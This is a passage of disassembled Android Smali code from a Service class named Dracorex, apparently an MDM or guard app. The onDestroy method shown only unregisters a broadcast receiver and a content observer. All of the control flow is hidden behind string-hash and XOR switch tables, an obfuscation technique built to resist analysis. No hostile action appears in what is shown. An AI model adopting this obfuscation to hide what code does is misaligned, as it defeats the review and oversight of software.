        0x413e8563 -> :sswitch_12d
        0x4de980a4 -> :sswitch_10c
        0x681f4131 -> :sswitch_e7
    .end sparse-switch

    :sswitch_data_20a
    .sparse-switch
        -0x48820318 -> :sswitch_148
        -0x2a9adaf0 -> :sswitch_173
        -0x29e07d46 -> :sswitch_145
        0x5ce06d42 -> :sswitch_f8
    .end sparse-switch

    :sswitch_data_21c
    .sparse-switch
        -0x7043730e -> :sswitch_106
        -0x6988baf8 -> :sswitch_142
        0x656ca6d6 -> :sswitch_134
        0x72a00781 -> :sswitch_13f
    .end sparse-switch

    :sswitch_data_22e
    .sparse-switch
        -0x3f5b83d3 -> :sswitch_109
        -0x25ba2cf6 -> :sswitch_11a
        0x2a86efe6 -> :sswitch_120
        0x5c124ed1 -> :sswitch_127
    .end sparse-switch
.end method

.method public final onDestroy()V
    .registers 5

    invoke-super {p0}, Landroid/app/Service;->onDestroy()V

    const v1, -0x7cc19d73

    :try_start_6
    const-string v0, "\u06e0\u06da\u06ec\u06df\u06da\u06e7\u06e5\u06dc\u06d8\u06d9\u06da\u06da\u06e5\u06df\u06e7\u06e1\u06e7\u06da\u06db\u06d8\u06eb\u06e5\u06e6\u06e1\u06d8\u06e2\u06da\u06db\u06eb\u06dc\u06da\u06e7\u06df\u06e1\u06e8\u06e1\u06dc\u06d7\u06eb\u06e8\u06d8\u06e6\u06db\u06d6\u06eb\u06e8\u06d9\u06d9\u06eb\u06e8\u06e2\u06e6\u06da\u06e1\u06d9\u06e5"

    :goto_8
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v2

    xor-int/2addr v2, v1

    sparse-switch v2, :sswitch_data_48

    goto :goto_8

    :goto_11
    :sswitch_11
    iget-object v0, p0, Lcom/guard/mdm/Dracorex;->c:Lcom/guard/mdm/c;

    invoke-virtual {p0, v0}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    :goto_16
    return-void

    :sswitch_17
    const-string v0, "\u06e6\u06e6\u06e5\u06d8\u06e4\u06ec\u06d9\u06e6\u06e6\u06d8\u06d8\u06db\u06da\u06e8\u06eb\u06da\u06ec\u06d9\u06db\u06da\u06da\u06e0\u06e7\u06e8\u06d9\u06e1\u06ec\u06e2\u06da\u06e7\u06da\u06dc\u06d8\u06d6\u06e4\u06e8\u06ec\u06e2\u06e8\u06d8\u06e1\u06d8\u06e5\u06d8\u06e6\u06da\u06dc\u06d8"

    goto :goto_8

    :sswitch_1a
    const v2, 0x3fcc3af6

    const-string v0, "\u06e0\u06e2\u06d8\u06db\u06d7\u06d7\u06e4\u06e1\u06e0\u06e1\u06db\u06dc\u06d8\u06d7\u06df\u06e8\u06d8\u06da\u06e7\u06e6\u06d8\u06e4\u06db\u06ec\u06e5\u06da\u06e7\u06db\u06d8\u06e5\u06d8\u06d7\u06eb\u06e6\u06d8\u06d7\u06e2\u06d6\u06e1\u06e1\u06e8\u06d8\u06e0\u06e5\u06e8\u06e0\u06da\u06d8\u06ec\u06e6\u06df\u06e4\u06e6\u06e7\u06d8"

    :goto_1f
    invoke-virtual {v0}, Ljava/lang/String;->hashCode()I

    move-result v3

    xor-int/2addr v3, v2

    sparse-switch v3, :sswitch_data_5a

    goto :goto_1f

    :sswitch_28
    iget-object v0, p0, Lcom/guard/mdm/Dracorex;->b:Lcom/guard/mdm/h;

    if-eqz v0, :cond_2f

    const-string v0, "\u06e6\u06eb\u06db\u06df\u06dc\u06e2\u06d8\u06db\u06e4\u06d8\u06dc\u06e1\u06dc\u06e2\u06e6\u06e8\u06d6\u06e2\u06e7\u06e6\u06e6\u06d8\u06dc\u06e1\u06e4\u06eb\u06dc\u06e1\u06e4\u06ec\u06e8\u06d8"

    goto :goto_1f

    :cond_2f
    const-string v0, "\u06e0\u06dc\u06db\u06d6\u06e2\u06d9\u06e8\u06e1\u06db\u06db\u06e1\u06e1\u06e8\u06d8\u06e5\u06d8\u06e2\u06df\u06e4\u06eb\u06e4\u06e5\u06d8\u06d6\u06e0\u06df\u06d7\u06da\u06e4\u06db\u06e6\u06da\u06df\u06ec\u06d8\u06d8\u06e2\u06e8\u06d6\u06db\u06e6\u06e6\u06df\u06e0\u06eb"

    goto :goto_1f

    :sswitch_32
    const-string v0, "\u06e4\u06e8\u06e2\u06e7\u06e2\u06e4\u06e1\u06e8\u06e5\u06d8\u06db\u06d6\u06e2\u06e6\u06e4\u06d6\u06d7\u06d6\u06e6\u06d8\u06e7\u06db\u06d8\u06e5\u06e1\u06e6\u06df\u06e1\u06da\u06e2\u06e1\u06e7\u06d8\u06e4\u06d7\u06ec\u06d7\u06e5\u06eb\u06ec\u06d6\u06e1\u06d8\u06ec\u06e1\u06e1\u06e4\u06d9\u06d6\u06d8\u06e7\u06dc\u06d8\u06d7\u06d7\u06e6\u06d8\u06e6\u06dc\u06e6"

    goto :goto_1f

    :sswitch_35
    const-string v0, "\u06d7\u06d6\u06e8\u06d8\u06d6\u06e8\u06d8\u06d8\u06e8\u06e1\u06e5\u06d8\u06d6\u06e0\u06df\u06e7\u06d6\u06e2\u06e5\u06e4\u06d6\u06d8\u06ec\u06db\u06df\u06e5\u06d7\u06d6\u06e7\u06e8\u06e2\u06e2\u06eb\u06e2\u06db\u06db\u06df\u06db\u06e1\u06e2"

    goto :goto_8

    :sswitch_38
    const-string v0, "\u06df\u06e5\u06e5\u06d8\u06e7\u06eb\u06e5\u06d8\u06d7\u06e1\u06e7\u06d8\u06d8\u06ec\u06e5\u06e7\u06d8\u06e5\u06d8\u06db\u06e4\u06d8\u06da\u06eb\u06dc\u06da\u06dc\u06df\u06e7\u06e0\u06e4\u06e4\u06e1\u06e5\u06e1\u06db\u06db\u06e5\u06da"

    goto :goto_8

    :sswitch_3b
    invoke-virtual {p0}, Landroid/content/Context;->getContentResolver()Landroid/content/ContentResolver;

    move-result-object v0

    iget-object v1, p0, Lcom/guard/mdm/Dracorex;->b:Lcom/guard/mdm/h;

    invoke-virtual {v0, v1}, Landroid/content/ContentResolver;->unregisterContentObserver(Landroid/database/ContentObserver;)V
    :try_end_44
    .catch Ljava/lang/Exception; {:try_start_6 .. :try_end_44} :catch_45

    goto :goto_11

    :catch_45
    move-exception v0

    goto :goto_16

    nop

    :sswitch_data_48
    .sparse-switch
        -0x6f76e70f -> :sswitch_11
        -0x3a50ef68 -> :sswitch_38
        0x38b816ec -> :sswitch_1a
        0x5590c22f -> :sswitch_3b
    .end sparse-switch

    :sswitch_data_5a
    .sparse-switch
        0x20c9c2a8 -> :sswitch_35
        0x6f4b8316 -> :sswitch_28
        0x73815faf -> :sswitch_32
        0x7c9f4fae -> :sswitch_17
    .end sparse-switch
.end method
